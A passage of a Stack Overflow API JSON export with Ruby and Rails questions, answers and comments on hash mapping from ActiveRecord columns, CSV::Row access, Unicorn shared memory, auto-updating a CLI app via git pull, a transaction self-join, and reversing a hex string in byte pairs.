pair.first } }\n\n# =&gt; [{:y=&gt;17.6, :label=&gt;:\"2011-12\"}, {:y=&gt;18.9, :label=&gt;:\"2012-13\"}, ... ]\n</code></pre>\n\n<p>Maybe you need to change the array of keys to delete into <code>['id', 'Sector', 'created_at', 'updated_at']</code></p>\n\n<p>If you have an array of hashes (your <code>b</code> variable), map each element with the coded provided:</p>\n\n<pre><code>result = array_of_hashes.map do |h|\n  h.delete_if { |k,v| [:id, :Sector, :created_at, :updated_at].include? k }\n  .each_with_object([]) { |pair, ary| ary &lt;&lt; { y: pair.last, label: pair.first } }\nend\n</code></pre>\n\n<h2>EDIT - Getting the correct array of hashes from database</h2>\n\n<p>This is one possible solution, since the column names are not standard, and the returned object from the database looks like this:</p>\n\n<pre><code>#&lt;ActiveRecord::Relation [#&lt;AnnualStateDomesticProduct3 id: 2, Sector: \"Crops\", 2011-12: 17.6, 2012-13: 18.9, 2013-14: 14.2, 2014-15: 13.1, 2015-16: 12.3, 2016-17: 12.1, created_at: \"2018-08-27 06:11:29\", updated_at: \"2018-08-27 06:11:29\"&gt;]&gt;\n</code></pre>\n\n<p>One workaround is to convert to JSON and then parse into a hash, as already pointed in one comment:</p>\n\n<pre><code>b = JSON.parse(AnnualStateDomesticProduct.all.to_json)\n</code></pre>\n\n<p>Also, to get attribute value from an object you can \"call the column\" like this:</p>\n\n<pre><code>a = AnnualStateDomesticProduct.find(2)\na.send('2011-12') # =&gt; 17.6\n</code></pre>\n"}], "owner": {"reputation": 21, "user_id": 10264147, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Coding ", "link": "https://stackoverflow.com/users/10264147/coding"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 129, "favorite_count": 0, "answer_count": 2, "score": -2, "last_activity_date": 1535377894, "creation_date": 1535357103, "last_edit_date": 1535360854, "question_id": 52035053, "link": "https://stackoverflow.com/questions/52035053/find-key-and-value-in-hash", "title": "Find key and value in hash", "body": "<p>I have an array of hashes:</p>\n\n<pre><code>b = [\n  {\n    id: 2,\n    Sector: \"Crops\",\n    2011-12: 17.6,\n    2012-13: 18.9,\n    2013-14: 14.2,\n    2014-15: 13.1,\n    2015-16: 12.3,\n    2016-17: 12.1,\n    created_at: \"2018-08-27T06:11:29.000Z\",\n    updated_at: \"2018-08-27T06:11:29.000Z\"\n  }\n]\n</code></pre>\n\n<p>I am getting this array from my db.</p>\n\n<p>I want to map the keys and the values of the hashes to get a new array like this:</p>\n\n<pre><code>[\n  {\n    y: 17.6,\n    label: \"2011-12\"\n  },\n  {\n    y:18.9,\n    label: \"2012-13\",\n    ...\n  }\n]\n</code></pre>\n\n<p>I am trying this code:</p>\n\n<pre><code>u = []\nb.each do |col|\n  u.push({y:25, label:\"2011\"})\n  u.push({y:35, label:\"2012\"})\nend\n</code></pre>\n\n<p>This generates a new array as I expected, but when I try to get key and value using:</p>\n\n<pre><code>b.each do |col|\n  col.each do |key, value|\n    puts \"The hash key is #{key} and the value is #{value}.\"\n  end\nend\n</code></pre>\n\n<p>I get this error:</p>\n\n<pre><code>undefined method `each' for\n</code></pre>\n\n<p>What is wrong with this? How can I get the key and value of any hash and how to use that in my case ?</p>\n\n<p>As I can see error is 2011-12: 17.6, 2011-12 should be string. But I am getting this value from db. How to resolve this issue if I want to create an array in my format.</p>\n\n<p>So my problem is my column names are in 2012-13 and when I am running a query I am getting value as it is. </p>\n\n<p>I am getting this when using b.inspect:</p>\n\n<pre><code> #&lt;ActiveRecord::Relation [#&lt;AnnualStateDomesticProduct3 id: 2, Sector: \"Crops\", 2011-12: 17.6, 2012-13: 18.9, 2013-14: 14.2, 2014-15: 13.1, 2015-16: 12.3, 2016-17: 12.1, created_at: \"2018-08-27 06:11:29\", updated_at: \"2018-08-27 06:11:29\"&gt;]&gt;\n</code></pre>\n\n<p>My migrations for this table is:</p>\n\n<pre><code>def change\ncreate_table :annual_state_domestic_product3s do |t|\n  t.string :Sector\n  t.float :'2011-12'\n  t.float :'2012-13'\n  t.float :'2013-14'\n  t.float :'2014-15'\n  t.float :'2015-16'\n  t.float :'2016-17'\n\n  t.timestamps\nend\n</code></pre>\n\n<p>So my question is how to get value in string format ? </p>\n"}, {"tags": ["ruby", "csv", "ruby-csv"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 2, "creation_date": 1535357430, "post_id": 52034887, "comment_id": 91020180, "body": "Why would you expect an arbitrary class (<code>CSV::Row</code> in this case) to respond to an arbitrary method of your choice (<code>description</code>)? This class author had implemented <code>#[]</code> method and did not bother to implement all the accessors."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 3, "creation_date": 1535358445, "post_id": 52034887, "comment_id": 91020658, "body": "<i>&quot;why isn&#39;t it accessible with dot notation?&quot;</i> \u2013 conflicts between CSV headers and methods with the same name would arise."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535360004, "post_id": 52034887, "comment_id": 91021400, "body": "@Stefan fwiw, this conflict does arise in the exact same way with hash-like access, does not it?"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "reply_to_user": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535360239, "post_id": 52034887, "comment_id": 91021517, "body": "@mudasobwa what do you mean? <code>task[&#39;index&#39;]</code> refers to a header with name <code>index</code>, not to the <a href=\"http://ruby-doc.org/stdlib-2.5.1/libdoc/csv/rdoc/CSV/Row.html#method-i-index\" rel=\"nofollow noreferrer\"><code>CSV::Row#index</code></a> method. I see no conflict there."}, {"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535360394, "post_id": 52034887, "comment_id": 91021610, "body": "@Stefan ah, I get it now. I thought you meant the case when method names collide because of two or more same headers in the input."}], "answers": [{"tags": [], "owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "is_accepted": false, "score": 1, "last_activity_date": 1535362896, "last_edit_date": 1535362896, "creation_date": 1535361119, "answer_id": 52036010, "question_id": 52034887, "link": "https://stackoverflow.com/questions/52034887/why-cant-you-use-dot-notation-when-accessing-information-from-csv-row-object/52036010#52036010", "title": "Why can&#39;t you use dot notation when accessing information from CSV row object?", "body": "<p><code>CSV</code> doesn't work that way but you could use <a href=\"http://ruby-doc.org/stdlib-2.5.1/libdoc/ostruct/rdoc/OpenStruct.html\" rel=\"nofollow noreferrer\"><code>OpenStruct</code></a>:</p>\n\n<pre><code>require 'ostruct'\n\nCSV.foreach(@file.path, headers: true) do |row|\n  task = OpenStruct.new(row.to_hash)\n  check_box = task.status == '0' ? '[ ]' : '[X]'\n  puts \"#{check_box} #{task.description}\"\nend\n</code></pre>\n\n<p>Or just create a custom class that fits your needs, e.g. via <a href=\"http://ruby-doc.org/core-2.5.1/Struct.html\" rel=\"nofollow noreferrer\"><code>Struct</code></a>:</p>\n\n<pre><code>Task = Struct.new(:status, :description) do\n  def checkbox\n    status == 0 ? '[ ]' : '[X]'\n  end\n\n  def to_s\n    \"#{checkbox} #{description}\"\n  end\nend\n\nCSV_OPTIONS = { headers: true, header_converters: :symbol, converters: :numeric }\nCSV.foreach(@file.path, CSV_OPTIONS) do |row|\n  task = Task.new(row[:status], row[:description])\n  puts task\nend\n</code></pre>\n"}], "owner": {"reputation": 282, "user_id": 9206962, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/8a463369008c395c14b569267e3c4f3e?s=128&d=identicon&r=PG&f=1", "display_name": "emijune", "link": "https://stackoverflow.com/users/9206962/emijune"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 110, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1535362896, "creation_date": 1535356372, "question_id": 52034887, "link": "https://stackoverflow.com/questions/52034887/why-cant-you-use-dot-notation-when-accessing-information-from-csv-row-object", "title": "Why can&#39;t you use dot notation when accessing information from CSV row object?", "body": "<p>I am trying to loop through a CSV file and print out information from the rows. I have two columns with headers \"description\" and \"status\". If I loop through the CSV file, I get a series of <code>&lt;CSV::Row \"description\":&lt;description&gt; \"status\":&lt;status&gt;</code> objects. I can access the info by using <code>csv_row[\"description\"]</code>, but not <code>csv_row.description</code>. Since Ruby is creating objects out of the information on each line, why isn't it accessible with dot notation?  </p>\n\n<p>Sample code:</p>\n\n<pre><code>CSV.foreach(@file.path, headers:true) do |task|\n    check_box = task[\"status\"] == 0 ? \"[ ] \" : \"[X] \"\n    puts check_box + task[\"description\"]\nend\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "memory", "unicorn"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535357532, "post_id": 52034729, "comment_id": 91020228, "body": "I don&#39;t think Ruby shares memory between processes."}, {"owner": {"reputation": 14184, "user_id": 6962, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/4a551074ddba4460f95d011c47190d0e?s=128&d=identicon&r=PG", "display_name": "Henrik N", "link": "https://stackoverflow.com/users/6962/henrik-n"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535358244, "post_id": 52034729, "comment_id": 91020565, "body": "@Stefan My impression is that newer (than 2.0 or thereabouts) versions of Ruby can rely on the underlying *ux system to get copy-on-write memory with forked processes, meaning that forked processes can share memory with their parent process until it changes in one of the child processes (then it&#39;s duplicated in memory before it&#39;s changed). But this is outside my area of expertise, thus my asking :) If you know more, please do set me straight."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535358833, "post_id": 52034729, "comment_id": 91020823, "body": "I see what you mean. But that&#39;s nothing Unicorn does, it&#39;s the way Ruby works. Unicorn has a <code>before_fork</code> hook. You could use that to check whether your object has already been initialized at that point."}, {"owner": {"reputation": 14184, "user_id": 6962, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/4a551074ddba4460f95d011c47190d0e?s=128&d=identicon&r=PG", "display_name": "Henrik N", "link": "https://stackoverflow.com/users/6962/henrik-n"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535359657, "post_id": 52034729, "comment_id": 91021233, "body": "@Stefan Thank you. I didn&#39;t mean to suggest this was unique to Unicorn, only to give context :) I tried checking in <code>before_fork</code> and it was indeed initialized. I also just tried using <code>smem</code> as described in <a href=\"https://unix.stackexchange.com/a/323736/129926\">unix.stackexchange.com/a/323736/129926</a>, looking at the &quot;USS&quot; value to represent &quot;unshared memory&quot;, and that number did indeed not go up for the workers (or the master, strangely) when doing it pre-fork, but it did go up for the workers when I tried doing it in <code>after_fork</code>."}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1535360027, "post_id": 52034729, "comment_id": 91021415, "body": "That&#39;s strange indeed. Is the object&#39;s initialization process asynchronous in some way? Or maybe it is actually not immutable. Try to replace it with a 60 MB frozen string and see what happens."}], "owner": {"reputation": 14184, "user_id": 6962, "user_type": "registered", "accept_rate": 45, "profile_image": "https://www.gravatar.com/avatar/4a551074ddba4460f95d011c47190d0e?s=128&d=identicon&r=PG", "display_name": "Henrik N", "link": "https://stackoverflow.com/users/6962/henrik-n"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 154, "favorite_count": 0, "answer_count": 0, "score": 2, "last_activity_date": 1535355671, "creation_date": 1535355671, "question_id": 52034729, "link": "https://stackoverflow.com/questions/52034729/verify-that-object-is-shared-in-memory-between-ruby-unicorn-processes", "title": "Verify that object is shared in memory between Ruby Unicorn processes?", "body": "<p>I do <code>FOO = MyBigImmutableObject.new(\"my.db\")</code> in a Ruby on Rails initializer, building a ~60 MB object.</p>\n\n<p>My assumption is that this happens before the Unicorn app server forks, and that this means it only uses 60 MB once, not once per worker process.</p>\n\n<p>How can I verify this, though? I've tried looking at the memory usage for Unicorn using <code>ps</code>, but that shows a 60 MB increase for every worker process when I introduce this constant. So I'm thinking maybe it doesn't distinguish shared memory in a way that helps me with this.</p>\n\n<p>Checking total used/free memory on the system seems tricky since I would have to isolate everything else.</p>\n\n<p>What are some good ways for me to verify that it's shared in memory?</p>\n"}, {"tags": ["ruby", "git", "github"], "comments": [{"owner": {"reputation": 105308, "user_id": 2035262, "user_type": "registered", "accept_rate": 78, "profile_image": "https://i.stack.imgur.com/pPtKA.jpg?s=128&g=1", "display_name": "Aleksei Matiushkin", "link": "https://stackoverflow.com/users/2035262/aleksei-matiushkin"}, "edited": false, "score": 0, "creation_date": 1535355224, "post_id": 52034561, "comment_id": 91019087, "body": "Make your application to update itself with e.g. <a href=\"https://github.com/piotrmurach/github\" rel=\"nofollow noreferrer\">github.com/piotrmurach/github</a>"}, {"owner": {"reputation": 209014, "user_id": 125816, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/7f5aa40b1e7a95599c7a19451f88ff3a?s=128&d=identicon&r=PG", "display_name": "Sergio Tulentsev", "link": "https://stackoverflow.com/users/125816/sergio-tulentsev"}, "edited": false, "score": 3, "creation_date": 1535355841, "post_id": 52034561, "comment_id": 91019434, "body": "Giving a CLI tool to a tech-clueless person? What can go wrong? :)"}, {"owner": {"reputation": 984, "user_id": 7322100, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/60d535f0625b6537caf1380aa0a61083?s=128&d=identicon&r=PG", "display_name": "ErniBrown", "link": "https://stackoverflow.com/users/7322100/ernibrown"}, "edited": false, "score": 0, "creation_date": 1535356414, "post_id": 52034561, "comment_id": 91019733, "body": "You can write a script which download master."}, {"owner": {"reputation": 173, "user_id": 8445655, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d02b6178ebd358d5257318ef0f8c0dc?s=128&d=identicon&r=PG&f=1", "display_name": "bdbasinger", "link": "https://stackoverflow.com/users/8445655/bdbasinger"}, "edited": false, "score": 0, "creation_date": 1535389213, "post_id": 52034561, "comment_id": 91038581, "body": "Ha true Sergio. Might just create a web application instead. Thanks for your input guys."}], "answers": [{"comments": [{"owner": {"reputation": 173, "user_id": 8445655, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d02b6178ebd358d5257318ef0f8c0dc?s=128&d=identicon&r=PG&f=1", "display_name": "bdbasinger", "link": "https://stackoverflow.com/users/8445655/bdbasinger"}, "edited": false, "score": 0, "creation_date": 1535389375, "post_id": 52034913, "comment_id": 91038649, "body": "Can\u2019t believe it was that simple. system(\u2018git pull\u2019) is all I needed. Thanks"}], "tags": [], "owner": {"reputation": 870, "user_id": 1151359, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5de27eae700f1eccbb8ed741a5a7bb53?s=128&d=identicon&r=PG", "display_name": "Alexander Randa", "link": "https://stackoverflow.com/users/1151359/alexander-randa"}, "is_accepted": true, "score": 1, "last_activity_date": 1535356461, "creation_date": 1535356461, "answer_id": 52034913, "question_id": 52034561, "link": "https://stackoverflow.com/questions/52034561/update-a-local-repository-with-changes-from-a-github-repository-not-git-pull-o/52034913#52034913", "title": "Update a local repository with changes from a GitHub repository? NOT &quot;git pull origin master&quot;", "body": "<p>try to execute a system call at the beginning of your application. \nlike:</p>\n\n<pre><code># some_script.rb\n\n# git repo initialization (if needed)\n# system('git init . &amp;&amp; git remote add ...')\nsystem('git pull origin master')\n\np 'main ruby logic'\n</code></pre>\n"}], "owner": {"reputation": 173, "user_id": 8445655, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5d02b6178ebd358d5257318ef0f8c0dc?s=128&d=identicon&r=PG&f=1", "display_name": "bdbasinger", "link": "https://stackoverflow.com/users/8445655/bdbasinger"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 48, "favorite_count": 0, "accepted_answer_id": 52034913, "answer_count": 1, "score": 0, "last_activity_date": 1535356461, "creation_date": 1535355018, "question_id": 52034561, "link": "https://stackoverflow.com/questions/52034561/update-a-local-repository-with-changes-from-a-github-repository-not-git-pull-o", "title": "Update a local repository with changes from a GitHub repository? NOT &quot;git pull origin master&quot;", "body": "<p>I have created a CLI application for a friend of mine written in Ruby. In order to be useful, this application needs to be updated weekly, which I will do by pushing the changes to GitHub. My friend is the furthest thing from tech-savvy and is incapable of following the steps in order to pull the changes from a GitHub repository. </p>\n\n<p>Is there an easier way for my friend to update their local version of the application each week? The solution might not involve GitHub at all, but I can't think of one. </p>\n\n<p>Thanks in advance for any solutions or suggestions.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord", "rails-activerecord"], "comments": [{"owner": {"reputation": 7844, "user_id": 1520557, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/9KKRA.png?s=128&g=1", "display_name": "Drenmi", "link": "https://stackoverflow.com/users/1520557/drenmi"}, "edited": false, "score": 0, "creation_date": 1535352443, "post_id": 52033512, "comment_id": 91017703, "body": "Is it correct that <code>DebitTransaction</code> has many <code>PaybackTransaction</code>s?"}, {"owner": {"reputation": 119, "user_id": 6371154, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tl5k5.png?s=128&g=1", "display_name": "shril", "link": "https://stackoverflow.com/users/6371154/shril"}, "reply_to_user": {"reputation": 7844, "user_id": 1520557, "user_type": "registered", "accept_rate": 67, "profile_image": "https://i.stack.imgur.com/9KKRA.png?s=128&g=1", "display_name": "Drenmi", "link": "https://stackoverflow.com/users/1520557/drenmi"}, "edited": false, "score": 0, "creation_date": 1535354910, "post_id": 52033512, "comment_id": 91018913, "body": "There is only one <code>PaybackTransaction</code> for one <code>DebitTransaction</code>."}, {"owner": {"reputation": 2343, "user_id": 6270554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PqRWJ.jpg?s=128&g=1", "display_name": "Hardik Upadhyay", "link": "https://stackoverflow.com/users/6270554/hardik-upadhyay"}, "edited": false, "score": 0, "creation_date": 1535357923, "post_id": 52033512, "comment_id": 91020415, "body": "Try this <code>Transaction.where(parent_transaction_id: nil, type: &#39;Debit&#39;).where.not(id: Transaction.select(:parent_transaction_id).uniq)</code>"}, {"owner": {"reputation": 119, "user_id": 6371154, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tl5k5.png?s=128&g=1", "display_name": "shril", "link": "https://stackoverflow.com/users/6371154/shril"}, "reply_to_user": {"reputation": 2343, "user_id": 6270554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PqRWJ.jpg?s=128&g=1", "display_name": "Hardik Upadhyay", "link": "https://stackoverflow.com/users/6270554/hardik-upadhyay"}, "edited": false, "score": 0, "creation_date": 1535368074, "post_id": 52033512, "comment_id": 91026099, "body": "@HardikUpadhyay your solution works but is it feasible to do without subquery and using self-join table statement?"}, {"owner": {"reputation": 2343, "user_id": 6270554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PqRWJ.jpg?s=128&g=1", "display_name": "Hardik Upadhyay", "link": "https://stackoverflow.com/users/6270554/hardik-upadhyay"}, "edited": false, "score": 0, "creation_date": 1535368513, "post_id": 52033512, "comment_id": 91026350, "body": "@shril Yes, you can. you have to write custom association. please take a look <a href=\"https://stackoverflow.com/questions/17476521/rails-has-many-custom-activerecord-association\" title=\"rails has many custom activerecord association\">stackoverflow.com/questions/17476521/&hellip;</a>"}, {"owner": {"reputation": 2343, "user_id": 6270554, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/PqRWJ.jpg?s=128&g=1", "display_name": "Hardik Upadhyay", "link": "https://stackoverflow.com/users/6270554/hardik-upadhyay"}, "edited": false, "score": 0, "creation_date": 1535368653, "post_id": 52033512, "comment_id": 91026443, "body": "<a href=\"https://mrbrdo.wordpress.com/2013/09/25/manually-preloading-associations-in-rails-using-custom-scopessql/\" rel=\"nofollow noreferrer\">mrbrdo.wordpress.com/2013/09/25/&hellip;</a>"}], "answers": [{"comments": [{"owner": {"reputation": 119, "user_id": 6371154, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tl5k5.png?s=128&g=1", "display_name": "shril", "link": "https://stackoverflow.com/users/6371154/shril"}, "edited": false, "score": 0, "creation_date": 1535355279, "post_id": 52034062, "comment_id": 91019115, "body": "Can anyone help me with the <b>ActiveRecord Query</b> for the above question? The records have single <code>PaybackTransaction</code> for every <code>DebitTransaction</code>."}, {"owner": {"reputation": 19244, "user_id": 1978251, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/73f7dd539ad8ec8372af0d06e4f76939?s=128&d=identicon&r=PG", "display_name": "engineersmnky", "link": "https://stackoverflow.com/users/1978251/engineersmnky"}, "reply_to_user": {"reputation": 119, "user_id": 6371154, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tl5k5.png?s=128&g=1", "display_name": "shril", "link": "https://stackoverflow.com/users/6371154/shril"}, "edited": false, "score": 0, "creation_date": 1535388391, "post_id": 52034062, "comment_id": 91038234, "body": "@shril what is wrong with the above? That is an <code>ActiveRecord</code> association as requested. <code>Transaction.find(123).payback_transaction</code> will result in <code>Transaction</code> 125 which appears to be your desired result. Although the belongs to needs a foreign key as well"}], "tags": [], "owner": {"reputation": 123, "user_id": 7768097, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/mYi77.png?s=128&g=1", "display_name": "kalzen", "link": "https://stackoverflow.com/users/7768097/kalzen"}, "is_accepted": false, "score": 0, "last_activity_date": 1535398787, "last_edit_date": 1535398787, "creation_date": 1535353137, "answer_id": 52034062, "question_id": 52033512, "link": "https://stackoverflow.com/questions/52033512/self-join-on-a-table-using-ruby-on-rails-activerecord/52034062#52034062", "title": "Self Join on a Table using Ruby on Rails ActiveRecord", "body": "<pre><code>class Transaction &lt; ApplicationRecord\n  has_one :payback_transaction, class_name: 'Transaction', foreign_key: :parent_transaction_id\n  belongs_to :debit_transaction, class_name: 'Transaction', foreign_key: :parent_transaction_id, optional: true\n</code></pre>\n\n<p><a href=\"https://guides.rubyonrails.org/association_basics.html#self-joins\" rel=\"nofollow noreferrer\">https://guides.rubyonrails.org/association_basics.html#self-joins</a></p>\n\n<p>You may want <code>has_many</code> instead of <code>has_one</code> if you want multiple paybacks per debit. </p>\n"}], "owner": {"reputation": 119, "user_id": 6371154, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Tl5k5.png?s=128&g=1", "display_name": "shril", "link": "https://stackoverflow.com/users/6371154/shril"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 1001, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1535398787, "creation_date": 1535350672, "last_edit_date": 1535352364, "question_id": 52033512, "link": "https://stackoverflow.com/questions/52033512/self-join-on-a-table-using-ruby-on-rails-activerecord", "title": "Self Join on a Table using Ruby on Rails ActiveRecord", "body": "<p>I have an ActiveRecord model named <code>Transaction</code>. \nEach transaction has four fields:</p>\n\n<ul>\n<li>TransactionID</li>\n<li>Type of Transaction</li>\n<li>UserID</li>\n<li>Parent TransactionID</li>\n</ul>\n\n<p>There are further two types of <code>Transaction</code>:</p>\n\n<ul>\n<li>Debit Transaction</li>\n<li>Payback Transaction</li>\n</ul>\n\n<p>For every Payback Transaction, the TransactionID of the Debit Transaction is mentioned in Parent TransactionID field.</p>\n\n<p>Using ActiveRecord Query I have to find the unpaid Debit Transactions of a particular user ID.</p>\n\n<hr>\n\n<p>Example data:</p>\n\n<pre><code>TransactionID Type of Transaction UserID Parent TransactionID\n123           Debit               1      null\n124           Debit               1      null\n125           Credit              1      123\n127           Debit               1      null\n</code></pre>\n\n<p>Querying the above data should return Transactions: <code>124, 127</code>.</p>\n"}, {"tags": ["ruby", "string", "reverse", "move"], "comments": [{"owner": {"reputation": 76, "user_id": 2738889, "user_type": "registered", "profile_image": "https://graph.facebook.com/641983433/picture?type=large", "display_name": "Kenny", "link": "https://stackoverflow.com/users/2738889/kenny"}, "edited": false, "score": 0, "creation_date": 1535348253, "post_id": 52033057, "comment_id": 91016324, "body": "What are you trying to do? Can you provide more detail?"}, {"owner": {"reputation": 3, "user_id": 6107140, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/0353ccbacc3a76b622a6a786e6b9e775?s=128&d=identicon&r=PG&f=1", "display_name": "Mike", "link": "https://stackoverflow.com/users/6107140/mike"}, "reply_to_user": {"reputation": 76, "user_id": 2738889, "user_type": "registered", "profile_image": "https://graph.facebook.com/641983433/picture?type=large", "display_name": "Kenny", "link": "https://stackoverflow.com/users/2738889/kenny"}, "edited": false, "score": 0, "creation_date": 1535348472, "post_id": 52033057, "comment_id": 91016379, "body": "not quite, so this is my string &quot;D21635D486450000C1&quot; i just need to reverse it in combinations of two, ill space the string out in two&#39;s so you get the idea. needs to look like this basically but with no spaces, i only did this to show you C1 00 00 45 86 D4 35 16 D2"}, {"owner": {"reputation": 76, "user_id": 2738889, "user_type": "registered", "profile_image": "https://graph.facebook.com/641983433/picture?type=large", "display_name": "Kenny", "link": "https://stackoverflow.com/users/2738889/kenny"}, "edited": false, "score": 0, "creation_date": 1535428312, "post_id": 52033057, "comment_id": 91050077, "body": "Ah i see what you mean now"}], "answers": [{"tags": [], "owner": {"reputation": 155803, "user_id": 314166, "user_type": "registered", "accept_rate": 82, "profile_image": "https://i.stack.imgur.com/zL1re.jpg?s=128&g=1", "display_name": "sawa", "link": "https://stackoverflow.com/users/314166/sawa"}, "is_accepted": false, "score": 0, "last_activity_date": 1535348604, "creation_date": 1535348604, "answer_id": 52033152, "question_id": 52033057, "link": "https://stackoverflow.com/questions/52033057/how-to-move-characters-from-right-to-left-of-string/52033152#52033152", "title": "How to move characters from right to left of string", "body": "<pre><code>\"D21635D486450000C1\"\n.reverse.gsub(/(.)(.)/, '\\2\\1')\n#=&gt; \"C100004586D43516D2\"\n\n\"D21635D486450000C1\"\n.reverse.gsub(/../, &amp;:reverse)\n#=&gt; \"C100004586D43516D2\"\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 280, "user_id": 7316787, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/816820e3b9b8c80a147cb698e5ec7d2d?s=128&d=identicon&r=PG", "display_name": "Rolandas Barysas", "link": "https://stackoverflow.com/users/7316787/rolandas-barysas"}, "is_accepted": false, "score": 0, "last_activity_date": 1535348709, 